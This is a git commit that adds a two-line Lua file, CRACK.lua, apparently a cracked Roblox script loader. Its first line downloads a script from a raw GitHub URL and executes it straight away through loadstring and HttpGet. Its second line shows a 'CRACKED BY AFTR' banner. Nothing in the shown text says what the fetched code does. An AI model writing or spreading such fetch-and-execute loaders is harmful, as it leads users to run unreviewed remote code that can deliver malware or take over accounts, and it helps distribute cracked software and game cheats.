31f9287f9a20ea42a756c204d228cec9f4c8f335
Aftr <evgenijzulin629@gmail.com>
2025-03-05 21:10:24 +0700

    Create CRACK.lua

---
+++ CRACK.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/tes.lua"))()
+Library:CreateNotification("CRACKED BY AFTR", "SCRIPTBLOX: @aftermath", 3, {"Okay", "Alright"})
